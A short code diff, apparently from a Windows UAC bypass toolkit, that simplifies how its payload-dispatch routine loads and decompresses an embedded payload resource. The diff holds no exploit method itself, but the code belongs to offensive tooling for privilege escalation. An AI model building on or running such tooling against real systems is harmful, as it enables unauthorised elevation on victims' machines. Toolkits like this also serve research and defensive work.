@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.64
 *
-*  DATE:        15 Feb 2023
+*  DATE:        04 Feb 2023
 *
 *  UAC bypass dispatch.
 *
@@ -319,28 +319,14 @@ NTSTATUS MethodsManagerCall(
 
     if (Entry->PayloadResourceId != PAYLOAD_ID_NONE) {
 
-        Status = supLdrQueryResourceDataEx(
+        Resource = supLdrQueryResourceData(
             Entry->PayloadResourceId,
             ImageBaseAddress,
-            &DataSize,
-            &Resource);
+            &DataSize);
 
-        if (!NT_SUCCESS(Status)) {
-
-            if (Status == STATUS_RESOURCE_TYPE_NOT_FOUND)
-                Status = STATUS_INVALID_IMAGE_FORMAT;
-
-            supRaiseHardError(Status);
-            return Status;
+        if (Resource) {
+            PayloadCode = g_ctx->DecompressRoutine(Entry->PayloadResourceId, Resource, DataSize, &PayloadSize);
         }
-
-        if (DataSize == 0 || Resource == NULL) {
-            Status = STATUS_INVALID_IMAGE_FORMAT;
-            supRaiseHardError(Status);
-            return Status;
-        }
-
-        PayloadCode = g_ctx->DecompressRoutine(Entry->PayloadResourceId, Resource, DataSize, &PayloadSize);
 
         if ((PayloadCode == NULL) || (PayloadSize == 0)) {
             return STATUS_DATA_ERROR;
